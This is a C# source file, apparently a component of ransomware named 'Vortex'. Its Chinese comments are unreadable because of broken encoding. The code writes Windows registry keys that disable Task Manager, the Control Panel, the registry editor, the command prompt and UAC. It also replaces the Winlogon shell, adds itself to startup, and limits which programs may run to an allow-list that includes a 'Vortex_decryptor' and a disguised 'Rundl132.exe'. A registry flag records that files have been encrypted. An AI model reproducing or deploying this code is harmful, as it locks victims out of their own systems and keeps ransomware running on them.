using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace VortexSecOps
{
    namespace Regedit_Set
    {
        public interface IRegistryConfigurer
        {
            /// <summary>
            /// �ж��ļ��Ƿ񱻼���
            /// </summary>
            /// <param name="createEncryped">true ���Ϊ���ܣ�Ĭ��Ϊfalse</param>
            /// <returns>trueΪ�Ѽ��ܣ�falseΪδ����</returns>
            bool IsDataEncryptedByAes(bool createEncryped = false);
            /// <summary>
            /// �� Windows ע���Ŀ������������Ƴ�ָ����Ӧ�ó���
            /// </summary>
            /// <param name="appName">Ҫ�ӿ������������Ƴ���Ӧ�ó�������ơ�
            /// ������Ӧ��֮ǰ��ӵ�����������ʱʹ�õ�����һ�¡�</param>
            void RemoveFromStartup(string appName);
            /// <summary>
            /// ��ָ����Ӧ�ó�����ӵ� Windows ע���Ŀ����������С�
            /// </summary>
            /// <param name="appName">Ҫ��ӵ������������Ӧ�ó�������ơ�
            /// �����ƽ���ʾ��ע���Ŀ����������б��С�</param>
            /// <param name="appPath">Ҫ��ӵ������������Ӧ�ó��������·����
            /// ��·��Ӧָ��Ӧ�ó���Ŀ�ִ���ļ���</param>
            void AddToStartup(string appName, string appPath);
            /// <summary>
            /// ���ݴ���Ĳ���ֵ�����û�����ϵͳ��������ʾ����CMD����
            /// </summary>
            /// <param name="configValue">�������� CMD ״̬������ֵ��2 ��ʾ��ȫ���ã�0 ��ʾ���á�</param>
            void ConfigureCMD(int configValue);
            /// <summary>
            /// ����ע���༭��
            /// </summary>
            /// <param name="disableFlag">����״̬�ı�־��Ĭ��ֵΪ 1�����ã�</param>
            void DisableRegistryEdit(int disableFlag = 1);
            /// <summary>
            /// ���ÿ����������������
            /// </summary>
            /// <param name="disableFlag">����״̬�ı�־��Ĭ��ֵΪ 1�����ã�</param>
            void DisableSysSettings(int disableFlag = 1);
            /// <summary>
            /// ���ݲ���ֵ���û���� Windows ��������
            /// </summary>
            /// <param name="enableRestriction">�Ƿ��������ƵĲ���ֵ</param>
            void ApplyWinRestricts(bool enableRestriction);
            /// <summary>
            /// ������������
            /// </summary>
            /// <param name="startupProgram">Ҫ���õ�������������</param>
            void ConfigStartupProg(string startupProgram);

            /// <summary>
            /// �ر��û��˻����ƣ�UAC��
            /// </summary>
            void DisableUAC();
        }

        // ����Windowsע����Ե���ϵͳ����
        public class RegistryConfigurer : IRegistryConfigurer
        {
            // ���ÿ����������������������a����״̬��Ĭ�Ͻ���
            private RegistryConfigurer() { }
            public static IRegistryConfigurer Create()
            {
                return new RegistryConfigurer();
            }
            void IRegistryConfigurer.DisableSysSettings(int disableFlag)
            {
                RegistryKey currentUserKey = null;
                RegistryKey controlPanelKey = null;
                RegistryKey taskManagerKey = null;
                const string EXPLORER_POLICIES_PATH = @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer";
                const string SYSTEM_POLICIES_PATH = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
                try
                {
                    currentUserKey = Registry.CurrentUser;
                    controlPanelKey = currentUserKey.CreateSubKey(EXPLORER_POLICIES_PATH);
                    controlPanelKey.SetValue("NoControlPanel", disableFlag);
                    taskManagerKey = currentUserKey.CreateSubKey(SYSTEM_POLICIES_PATH);
                    taskManagerKey.SetValue("DisableTaskMgr", disableFlag);
                }
                catch (Exception)
                {

                }
                finally
                {
                    if (taskManagerKey != null)
                    {
                        taskManagerKey.Close();
                    }
                    if (controlPanelKey != null)
                    {
                        controlPanelKey.Close();
                    }
                    if (currentUserKey != null)
                    {
                        currentUserKey.Close();
                    }
                }
            }

            // ����ע���༭��������disableFlag����״̬��Ĭ�Ͻ���
            void IRegistryConfigurer.DisableRegistryEdit(int disableFlag)
            {
                RegistryKey currentUserKey = null;
                RegistryKey systemPoliciesKey = null;
                try
                {
                    currentUserKey = Registry.CurrentUser;
                    const string System = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
                    systemPoliciesKey = currentUserKey.OpenSubKey(System, true);
                    if (systemPoliciesKey == null)
                    {
                        systemPoliciesKey = currentUserKey.CreateSubKey(System);
                    }
                    systemPoliciesKey.SetValue("DisableRegistryTools", disableFlag);
                }
                catch (Exception)
                {

                }
                finally
                {
                    if (systemPoliciesKey != null)
                    {
                        systemPoliciesKey.Close();
                    }
                    if (currentUserKey != null)
                    {
                        currentUserKey.Close();
                    }
                }
            }

            // �ر��û��˻����ƣ�UAC��
            void IRegistryConfigurer.DisableUAC()
            {
                // ����ע����� System �����Ӽ���·������
                const string SYSTEM_POLICIES_PATH = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
                // ����Ҫ���õ�ע���ֵ���Ƴ��������ڿ��� UAC ����
                const string ENABLE_LUA_VALUE_NAME = "EnableLUA";

                RegistryKey localMachineKey = null;
                RegistryKey systemPoliciesKey = null;
                try
                {
                    // �򿪵�ǰ�û���ע������
                    localMachineKey = Registry.LocalMachine;
                    // �����Կ�д��ʽ�� System �����Ӽ�
                    systemPoliciesKey = localMachineKey.OpenSubKey(SYSTEM_POLICIES_PATH, true);
                    // ���Ӽ������ڣ��򴴽����Ӽ�
                    if (systemPoliciesKey == null)
                    {
                        systemPoliciesKey = localMachineKey.CreateSubKey(SYSTEM_POLICIES_PATH);
                    }
                    // �� EnableLUA ��ֵ����Ϊ 0���Թر� UAC
                    systemPoliciesKey.SetValue(ENABLE_LUA_VALUE_NAME, 0);
                }
                catch (Exception)
                { }
                finally
                {
                    // �� software �Ӽ��Ѵ򿪣���ر���
                    if (systemPoliciesKey != null)
                    {
                        systemPoliciesKey.Close();
                    }
                    // ����ǰ�û������Ѵ򿪣���ر���
                    if (localMachineKey != null)
                    {
                        localMachineKey.Close();
                    }
                }
            }
            void IRegistryConfigurer.ConfigStartupProg(string startupProgram)
            {
                // Winlogon ע����Ӽ�·������
                const string WINLOGON_SUBKEY_PATH = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
                // ע���ֵ���Ƴ���
                const string SHELL_VALUE_NAME = "Shell";

                RegistryKey localMachineKey = null;
                RegistryKey winlogonKey = null;
                try
                {
                    // �� HKEY_LOCAL_MACHINE ����
                    localMachineKey = Registry.LocalMachine;
                    // ���Դ� Winlogon �Ӽ�
                    winlogonKey = localMachineKey.OpenSubKey(WINLOGON_SUBKEY_PATH, true);
                    // ���������򴴽�
                    if (winlogonKey == null)
                    {
                        winlogonKey = localMachineKey.CreateSubKey(WINLOGON_SUBKEY_PATH);
                    }
                    // ���� Shell ֵ
                    winlogonKey.SetValue(SHELL_VALUE_NAME, startupProgram);
                }
                finally
                {
                    // �ر��Ӽ�
                    if (winlogonKey != null)
                    {
                        winlogonKey.Close();
                    }
                    // �رո���
                    if (localMachineKey != null)
                    {
                        localMachineKey.Close();
                    }
                }
            }

            // ���ݲ���ֵenableRestriction���û����Windows��������
            void IRegistryConfigurer.ApplyWinRestricts(bool enableRestriction)
            {
                RegistryKey currentUserKey = null;
                RegistryKey explorerPoliciesKeyForRestrictRun = null;
                RegistryKey explorerPoliciesKeyForAllowedProgs = null;
                const string WINDOWS_EXPLORER_POLICIES_PATH = @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer";
                if (enableRestriction)
                {
                    try
                    {
                        currentUserKey = Registry.CurrentUser;
                        explorerPoliciesKeyForRestrictRun = currentUserKey.CreateSubKey(WINDOWS_EXPLORER_POLICIES_PATH);
                        explorerPoliciesKeyForRestrictRun.SetValue("RestrictRun", 1);
                        explorerPoliciesKeyForAllowedProgs = currentUserKey.CreateSubKey($"{WINDOWS_EXPLORER_POLICIES_PATH}\\RestrictRun");
                        // ����������еĳ����б�
                        string[] allowedPrograms = {
                    Process.GetCurrentProcess().ProcessName + ".exe",
                    "msedge.exe",
                    "WeChat.exe",
                    "shutdown.exe",
                    "ReAgentc.exe",
                    "Rundl132.exe",
                    "@Vortex_decryptor.exe",
                    "notepad.exe"
                    };
                        foreach (string program in allowedPrograms)
                        {
                            explorerPoliciesKeyForAllowedProgs.SetValue(program, program);
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                    }
                    finally
                    {
                        if (explorerPoliciesKeyForRestrictRun != null)
                        {
                            explorerPoliciesKeyForRestrictRun.Close();
                        }
                        if (explorerPoliciesKeyForAllowedProgs != null)
                        {
                            explorerPoliciesKeyForAllowedProgs.Close();
                        }
                        if (currentUserKey != null)
                        {
                            currentUserKey.Close();
                        }
                    }
                }
                else
                {
                    try
                    {
                        currentUserKey = Registry.CurrentUser;
                        explorerPoliciesKeyForRestrictRun = currentUserKey.CreateSubKey(WINDOWS_EXPLORER_POLICIES_PATH);
                        explorerPoliciesKeyForRestrictRun.DeleteValue("RestrictRun");
                    }
                    catch (Exception)
                    {

                    }
                    finally
                    {
                        if (explorerPoliciesKeyForRestrictRun != null)
                        {
                            explorerPoliciesKeyForRestrictRun.Close();
                        }
                        if (currentUserKey != null)
                        {
                            currentUserKey.Close();
                        }
                    }
                }
            }
            void IRegistryConfigurer.ConfigureCMD(int configValue)
            {
                const string registryPath = @"Software\Policies\Microsoft\Windows\System";
                const string registryValueName = "DisableCMD";
                RegistryKey cmdRegistryKey = null;
                try
                {
                    cmdRegistryKey = Registry.CurrentUser.OpenSubKey(registryPath, true);
                    if (cmdRegistryKey == null)
                    {
                        cmdRegistryKey = Registry.CurrentUser.CreateSubKey(registryPath);
                    }
                    cmdRegistryKey.SetValue(registryValueName, configValue, RegistryValueKind.DWord);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
                finally
                {
                    if (cmdRegistryKey != null)
                    {
                        cmdRegistryKey.Close();
                    }
                }
            }
            void IRegistryConfigurer.AddToStartup(string appName, string appPath)
            {
                const string startupRegistryPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
                RegistryKey registryKey = null;
                try
                {
                    registryKey = Registry.LocalMachine.OpenSubKey(startupRegistryPath, true);
                    if (registryKey == null)
                    {
                        registryKey = Registry.LocalMachine.CreateSubKey(startupRegistryPath);
                    }
                    registryKey.SetValue(appName, appPath, RegistryValueKind.String);
                }
                catch (Exception)
                {

                }
                finally
                {
                    if (registryKey != null)
                    {
                        registryKey.Close();
                    }
                }
            }
            void IRegistryConfigurer.RemoveFromStartup(string appName)
            {
                const string startupRegistryPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
                RegistryKey registryKey = null;
                try
                {
                    registryKey = Registry.LocalMachine.OpenSubKey(startupRegistryPath, true);
                    if (registryKey != null && registryKey.GetValue(appName) != null)
                    {
                        registryKey.DeleteValue(appName);
                    }
                }
                catch (Exception)
                {

                }
                finally
                {
                    if (registryKey != null)
                    {
                        registryKey.Close();
                    }
                }
            }
            bool IRegistryConfigurer.IsDataEncryptedByAes(bool createEncryped)
            {
                RegistryKey localMachineKey = null;
                RegistryKey encrypted = null;
                string appName = "VortexCrypt";
                string encryptedFlagValueName = "FilesEncrypted";
                const int hexValue = 346892;

                if (Environment.Is64BitProcess)
                {
                    try
                    {
                        localMachineKey = Registry.LocalMachine;
                        encrypted = localMachineKey.CreateSubKey($"SOFTWARE\\{appName}");
                        object value = encrypted.GetValue(encryptedFlagValueName);
                        if (value == null || Convert.ToInt32(value) != hexValue)
                        {
                            if (createEncryped == true)
                            {
                                encrypted.SetValue(encryptedFlagValueName, hexValue, RegistryValueKind.DWord);
                            }
                            return false;
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return false;
                    }
                    finally
                    {
                        if (encrypted != null)
                        {
                            encrypted.Close();
                        }
                        if (localMachineKey != null)
                        {
                            localMachineKey.Close();
                        }
                    }
                }
                else
                {
                    try
                    {
                        localMachineKey = Registry.LocalMachine;
                        encrypted = localMachineKey.CreateSubKey($"SOFTWARE\\WOW6432Node\\{appName}");
                        object value = encrypted.GetValue(encryptedFlagValueName);
                        if (value == null || Convert.ToInt32(value) != hexValue)
                        {
                            if (createEncryped == true)
                            {
                                encrypted.SetValue(encryptedFlagValueName, hexValue, RegistryValueKind.DWord);
                            }
                            return false;
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return false;
                    }
                    finally
                    {
                        if (encrypted != null)
                        {
                            encrypted.Close();
                        }
                        if (localMachineKey != null)
                        {
                            localMachineKey.Close();
                        }
                    }
                }
                return true;
            }
        }
    }
}